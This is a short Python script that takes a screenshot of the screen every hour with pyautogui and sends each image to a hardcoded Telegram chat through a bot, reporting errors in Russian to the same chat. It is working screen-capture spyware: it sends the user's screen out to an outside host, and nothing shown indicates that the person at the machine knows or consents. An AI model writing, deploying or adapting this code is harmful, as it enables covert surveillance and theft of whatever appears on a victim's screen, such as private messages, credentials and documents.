import pyautogui
import time
import telebot

api_token = ''

bot = telebot.TeleBot(api_token)

j = 0
while True:
    try:
        screen_shot = pyautogui.screenshot(f'{j}.png')
    except Exception as e:
        bot.send_message(1107191282, f'Ошибка скриншота {e}')
        time.sleep(10)
        continue
    j += 1
    try:
        bot.send_photo(1107191282, screen_shot)
        time.sleep(3600)
    except Exception as e:
        bot.send_message(1107191282, f'Ошибка отправки фото {e}')
        time.sleep(10)
        continue
